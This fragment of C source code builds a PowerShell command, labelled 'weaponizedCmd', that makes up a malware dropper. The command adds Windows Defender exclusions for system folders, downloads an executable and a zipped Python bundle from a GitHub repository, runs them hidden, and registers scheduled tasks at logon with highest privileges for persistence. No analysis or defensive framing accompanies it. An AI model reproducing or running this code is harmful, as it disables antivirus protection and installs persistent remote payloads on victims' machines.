...
int main() {
    ...
    swprintf_s(weaponizedCmd, 4086, 
        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionProcess 'pdf.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\';Add-MpPreference -ExclusionPath 'C:\\Windows\\';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wordPath='C:\\Windows\\Temp\\word.zip'; $extractPath='C:\\Windows\\Temp\\word\\'; $zipPath='C:\\Windows\\Temp\\pdf.exe'; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/raw/refs/heads/main/Client.exe', $zipPath); Start-Process $zipPath  -WindowStyle Hidden; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/releases/download/run/office.zip', $wordPath); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($wordPath, $extractPath); Remove-Item $wordPath -Force; Start-Process '$extractPath\\python.exe' -ArgumentList '$extractPath\\Lib\\system.py'  -WindowStyle Hidden; schtasks /create /tn 'Activepdf' /tr $zipPath /sc onlogon /delay 0001:00 /rl highest /f; schtasks /create /tn 'ActiveOffices' /tr \\\"'$extractPath\\pythonw.exe' \\'$extractPath\\Lib\\system.py'\\\" /sc onlogon /delay 0001:00 /rl highest /f \"");
